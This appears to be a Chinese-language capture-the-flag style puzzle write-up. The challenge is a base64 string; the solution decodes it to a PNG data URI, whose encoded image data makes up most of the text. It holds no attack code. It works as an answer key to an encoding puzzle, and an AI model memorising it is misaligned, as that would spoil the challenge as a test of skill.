dUdXT2ZPblkzOUd4WXZXU0pidDI1MTRweGhHeVJBQWlRUUdRSTJocEVUazdaWmdmczB4ZDlzT0lEYmJPY2Q1N0VoWnBzZkxkV1ZRU2VPbHhkdDJQcDgyUnF5NmM0aENyYUdLNFpZMGFKRnBVbmp4c1o4SjA2Y2FLeExSUklnQVJMSUZBSmVyb2dWTGx4WTh1ZlBiNHdXMVNCU0ZadFZwRDlaQkJDa09wNmNuenZlTWlwMmY0b3Jnem43RFBMZnB4UXFaRFc4SDMvNHdVby9IZVdvMkJxdUdHSWRPblNRWXczdllsYXRXaVhyMXExTDUxandzeVJBQWlRUVNRSlZxMWIxYkY1VnFsUXg3Z3ZKWE5NcEp2L3R0OThhOTFYQXdqZzBialNCb2sxMUFUU3piOSsrQksyRi82M1RpeGUzbXNUM0hocGlVYkUxSEUvb2lvaUpsaTFhR0IrNGlaTW1HZXRTa1FSSUlOZ0VacytlTFJzM2J2UjlrTmhPYVdIeE80UXhMMTI2MUdqY2E5ZXVOZEp6UXFsWXNXSnk1cGxuZWxLVHMrNUZGeGtQZWZQbXpYTGt5QkZqL2R5S1gydUIrL0xseStkK09lNy9YdnNjMlViOVlTNVJsam9XbWZYQndhdmdoU2paR280Yll0ZGVlNjN4OGpaKy9ONTU1NTBvbjhPY0d3bGtGQUZrblBjaTYzd3lxS2VkZHBxVkliWnc0VUlaTzI1Y3NtWjllZi9paXkvMnhCQzd5TUlRUzJkYkVoQnRqSmNpUllwNHl0Mm1QL2k2N2RxMXk5UHhlZGxaaVJJbHhHWjdIUDUvWDMzMWxTZERqSkt0NGVqV0pHcWpYZGV1bmZGQm1Qek1NOGE2VkNRQkVpQ0JUQ1J3Y2QyNnJrOGJUdnFtOVlBeG1IUlhQVzB1MW4vV0ZVRXZwVUtGQ3NiZDdkaXhJNjJWUWVPT2ZGSnMwS0NCVmM5YnRtd1JMMnB2UnMzV2NOUVF1L3JxcTZXUW9XUGZ0bTNiWk1HQ0JWWUhtY29rUUFJa2tHa0V6am5uSExHSlpreUZUOU1tVFl3L2hpMUptN0kzOFJxMjhTODc4Y1FUclZabDR2Vm44OXBaRnI1eW4zL3hoVTNUb2RKRnVTdWIybzJZM0FhUDNCS2labXM0Wm9naFpMVlR4NDdHSjlxVUtWTUUrY01vSkVBQ0pFQUNSeWVBVE8vWGQrOStkSVUwM3lsUW9JQzBzOWpKZU8rOTk2eTJGdU1OYjYxbGdGYkRoZzNqTmVQNGExaElxRjI3dG5HNzZ5M25ZZHh3QUJTN2FubENSTkxhaUUwNUpKdDJjK3BHMGRad3pCQnJwRitVNG9iUkZidDM3NWJaTDcyVWt5My9KZ0VTSUFFU09BcUJKcnBpQlg4ZE42Uk5telpXWldubXpwdVg5akMrK2VZYksxK2kxcTFhQ1F4R3Q2VkQrL2JHRWY4WWk2MUI2ZmI0bldxL2N1WEtWZ3NyNkJjTEswczk4UG1Pb3EzaG1DRUc2OWxVcGsrZkxqLzk5Sk9wT3ZWSWdBUklJS01KNU11WFQyNjc5VmJIR1NDNnRLT21HeklWL0c2LzhjWWJwdW9KOVZhc1hKbncvWnh2SXZoaTRNQ0JPVjl5L0crc2hObVV5b0ZqK2djZmZKRDJPTWFNR1NPalI0MFMyK2pFdERzK1NnTmx5NWFWVVNOSEN2eXdiR1Q1OHVYeWxRY1JwRkcwTlJ3eHhPQk1paEJyRTBGbzYvUVpNMHhVcVVNQ0pFQUNKUEFmQXRpZXM5bENUQVlPVzU1REJnK1dVMDQ1SlpucWY5OUhGUlRiV3BILy9YQ3VQMlpZWGdldXVQeHlhYXRSK1c0SUREMndzTWtLUC8rVlY4UW1NZTNSeG8zYWpIWHExSkhSbzBmTERGMmtnTCtlelRpTzFtNHFyeU9seUZNNkRsTmY3NXg5L04rc1dUbi9kZVh2cU5vYWpoaGkzYnAxTTRZK1N3K1dFeWV2Y1lkVUpBRVNJSUdJRU9qZHE1ZlVxbG5Ua2RuY2Z0dHRjdjc1NTF1MTljSUxMMWpwSjFLR1A5R2FOV3NTcWZ6aHZkNjllMHRqaTZvdGYyZ2d6Z3ZGVHo5ZC92bkVFMVlHS1pwNTl0bG40N1NXM2tzVksxYVVRWU1HeWJ5NWN3WFhWWnRJMW5SNmh1SFhYZjBRcDArYkpzaFdieXZZYWw2aVJycmJFbFZiSTIxRERCRTk1NTU3cmhGLzVGeUJrejZGQkVpQUJFakFuZ0MyS0I5NzdERzVYRmVIVWhXMDBmT09Pd1ExK214azBadHZ5a3FMN1VTVHRxZGFHak9vMlBMd1F3L0o0SWNmbHBOMEpTbGRhZGFzbWN5Y09WUGdFMlVqSzFhc2tJOC8vdGptSTFhNlNPU0xyZWk1YytZSVhIa1FyR0dUejh1ME01d0xXR21jcXRmbFcyKzV4Y28vTG1jZmp6Myt1T3RwSzZKc2E2U2QwTFdiaFcvWXZQbnpaV2VFazkvbFBESDVOd21RQUFtNFFRQUd5TENoUTJXbXJrNE5IejdjeXQ4V3F6OURoZ3dSMjlKSkJ3OGVsT0hEaGprK25UZlZ1RU5PTWROQXIrd0JOR3JVS0xZQU1HWHFWSGxka3dnam41ZXB3SmhEOGxwVWdFR3kzRlFFL1hvbGxYU1ZESTliMUZEYThza25zbWIxYXZsSVZ4T3hvcGhLM2k3NGZsV3FWRW5xMTY4dlY2a2hhck0xSFcvT1NNbyt6NEVBam5odDUzd3R5clpHV29ZWTlwTk5UMlJFVkV4aU9hT2M1eFgvSmdFU0lJR1VDU0NTRUtzWjhGVjYrZVdYWXhmbWVJM0JGK3lpQ3krVTVzMmJ5eVdYWEpMU3FzZUVpUk5kY2NUR2RXSEVpQkh5a0s1eTJRcTIwTzdVclVwczE2THMxTUpGaStUenp6OFhiSk1oTWgvMUxKRUw2OVJUVDVWVE5RM0RxZW9IaHEzWStzb0F1Y2xTbFpWYUgvbXR0OTVLOWVOcGZlNU12ZWJpa1MzWVpZSXh0blhyVnRtM2YzK3M3aVZxWCs3WHg4LzZIdXAwWXE1NG9HSUE2b25DR2Q4cEg3UWZ0SzdrUHg1OE1IczRyajFIM2RaSXl4RHIycVdMNU1tVHh3ZytuRHcvKyt3ekkxMHFrUUFKa0FBSkpDZFFzR0JCYWRlMmJleUJVanZidDIrUHJRNGQwS0NvVXpRblZoRTFWckRhQklmd1ZBWEp0OTI4aVlZaENkOG8yNjNTN1BuZ0dsUzlldlhZSS9zMXQ1Ni8wQVN1ZDk1NXAxdk5XN2VMMVQxc3E5cHVyVnAzRk9jRGh3OGZsb0gzM3g4NzUrSzg3ZWhMVWJjMVVqYkVUdGNsYml3UG04cUVDUk5NVmFsSEFpUkFBaGxQQUFaUUhsM05LbUdZbnhHUmYzallianNtQW8wVmozNzkrd3RTTmJncGo2dXpmTmx5NWFSZWlsdUZibzR0dTIwRW1kMTIrKzJ5ZCsvZTdKY3k5aGtybWZmZGQxOXNXOWh0Q0psZ2E2VHNySS9jTTNEME01RlZ1cFM3ZnYxNkUxWHFrQUFKa0FBSktBR2tpYmo3cnJzRUt3OStDSXl2MjlXcC84TVBQM1M5ZTVSTkdqQmdRTXdIeXZYT1V1Z0F4NkJ2djM2eExjQVVQaDZwaitCWS9mMkJCd1ErMzE1SUp0Z2FLUmxpU0FKNHpUWFhHQjhEK0JkUVNJQUVTSUFFN0FpOHJ3bER4NDRkYS9jaEI3UmhlUFJUdzhQcEtNbEVRME9PeVI0OWVsaW50RWpVcGhQdndmZXFUNTgrc216Wk1pZWFDM1ViZS9ic2taN3FrL2VTUjVWeE1zWFdTTWtRZzA4Q25DQk5aS01XQVYyNmRLbUpLblZJZ0FSSWdBUnlFUmlqaHRnY1RXUGdsV1Q3L3J5NWVMRlhYZjYzbjUwN2QwcjM2NitYVVpwVTFLK1Z3UDhPUnY5WTgvNzdnaEpRU04yUjZZS0tDaTAxUUdTeGgrZEZwdGdhMW9ZWURMQzJhb2laeXFUSmswMVZxVWNDSkVBQ0pKQ0xBUHh4N2xWL25FRWFXWWdvT1RkbDgrYk4wcUZqUjVtckNVWDlFc3dYWlgrUVlCU3BMZnlRbkdOQUFJU2Jza3hMQTMzMzNYZHVkcEZXMi9DSjY2L2J4bmZxcWlBaVViMlNUTEkxekp5OGNwQnZvVnVTaU5ReEVVU1l2UGJhYXlhcTFDRUJFaUFCRWtoQUFJbEhzY09BZkY2cFpEOVAwSFRNd0JzM2ZyeU0xOGVoUTRjU3FYcjJIclpsVzdSc0tWZGRkWldnR0hmcDBxVmQ3eHQrY1hQVUNFWGljYStpL0ovUVFJVW5uM3hTa0xBVXFUV1FZc1NONUsyMjhKQVc0M2s5NTJDVUkyakRhOGtrVzhQS0VJTnpma2U5V3pJVkpMM0RuVVdVNU1jZmZ6U2V6a0VMWGVOR0RSUnR4b2ptYlBYakRjRzBEU1NHaExPbkY0SXhtV1RmTmgyN3paaHQyc1NGeisyb05KdXhSMEVYSzBmZ2FocFFaSE84L09TemJ0MDZhYVAxRnBGRERINjZKVXFVU0dzNHVNQmlDM0tpK3ZIaXdoczB3ZS9GODg4L0g4dCszNkJCQStuY3FaTXJhU3F3NmpORCswRVdlL2hCZVMyNFRxN1dSSzE0UEtxVkU4cVVLU01vUWw2dGFsV3BWcTJhWjRZWnZqZllnb1FCWmx0K3lrbG1tV1pyNUtsVXVienhWUkhsSVA2aDBSSW1nb1I2VFpvMnRjcjZiTkl1ZFVpQUJFZ2d6QVFXNm9XdXNDWVlUU1pZL1dyYnJsMUN0UXN1dUVCYWFJYjRCdlhyR3lkcS9lbW5uMklKU1Y5ZHNDRDJqUC9ESkVoblVLTkdqZGlqcGo3RGFMRVZwS0o0WC8yL1lQaThoMHoxSDMwVW1KWEFlSFBKeXNxS3BTV3BldmJac1lTc01NQkxsU3BsdkRzVnIwMjhobTFYR1Bmck5Lc0JucEd0SDhhdjM1SnB0b2JWaWxnWGk5cGswN1I0YU5pKzRINmZmT3lmQkVpQUJHd0lMRmYvSWp5d2dvQWNZdGl5UkozQ1l2cU1UT3BZRmR5bG1lYVI3RFg3Z1l0dm1GZGd2Lzc2NjFoSm5leXlPaWpSVTFxTmtpeDFtVGxaSDluUEoyb1MyNS9WeU55cldlYjNxZzlXN0ZsWHZuWXJqMDgxRTcxWEsvTTJ4L05vdXNpV2oxSkNlT1FVWk15SFVZWmNjd1gwNy96cXd3M2ZxdnlhVWY4RWZSeW5DVjkvVk1NcWxtMWZqVThZb05rUCtOK2hDa0VRSmROc0RXTkRESFdwVUdiQVJKRC9Cc3U4RkJJZ0FSSWdBZmNKd09DQ2dZSkhwZ20yRXYzWVRnd0NaMXhyTjIzYUZIc0VZVHhPakNFVGJRM2pxRW1VR0RDVldiTm14YXh1VTMzcWtRQUprQUFKa0FBSmtFQW0yaHBHaGhqMjQxSEx5MFRnN0RmVnc4cjBKbU9pRGdtUUFBbVFBQW1RUUxBSlpLcXRZV1NJZGV2YTFmam9ZZDkrcC9valVFaUFCRWlBQkVpQUJFakFsRUNtMmhwSkRiRUtGU3BJM2JwMWpUZ2lCSmNKWEkxUVVZa0VTSUFFU0lBRVNPQS9CRExaMWtocWlObEVMeUFmalZkSjhIajJrZ0FKa0FBSmtBQUpSSU5BSnRzYUNRMHhoTVUyYk5qUStDZ2pLU0NGQkVpQUJFaUFCRWlBQkV3SlpMcXRrZEFRYTZmSkJQUG16V3ZFY3VXcVZiSmVrOEpSU0lBRVNJQUVTSUFFU01DVVFLYmJHZ256aU1IeDNyVHN4ZHExYTAyWlU0OEVTSUFFU0lBRVNJQUVZZ1F5M2RaSWFJaWgzQUVlRkJJZ0FSSWdBUklnQVJKd2cwQ20yeG9KdHliZEFNNDJTWUFFU0lBRVNJQUVTSUFFZmlOQVE0eG5BZ21RQUFtUUFBbVFBQW40UklDR21FL2cyUzBKa0FBSmtBQUprQUFKMEJEak9VQUNKRUFDSkVBQ0pFQUNQaEdnSWVZVGVIWkxBaVJBQWlSQUFpUkFBalRFZUE2UUFBbVFBQW1RQUFtUWdFOEVhSWo1Qko3ZGtnQUprQUFKa0FBSmtBQU5NWjRESkVBQ0pFQUNKRUFDSk9BVEFScGlQb0ZudHlSQUFpUkFBaVJBQWlSQVE0em5BQW1RQUFtUUFBbVFBQW40UklDR21FL2cyUzBKa0FBSmtBQUprQUFKSkt3MVNUd2tRQUlrUUFMT0V1alpxNWNVek1wSzJ1ak9YYnVTNmxDQkJFZ2cvQVR5VktwYy9rajRwOEVaa0FBSmtBQUprQUFKa0VENENQdy9CTW1TU0lkbU1Dc0FBQUFBU1VWT1JLNUNZSUk9題目說明： 從這堆亂碼中找到答案。解答：其實這題也相當直白，不需想太多；常使用編碼的人應該能發現這堆亂碼就只是base64的字串，我們先把他 解回去 ，得到：data:image/png;base64,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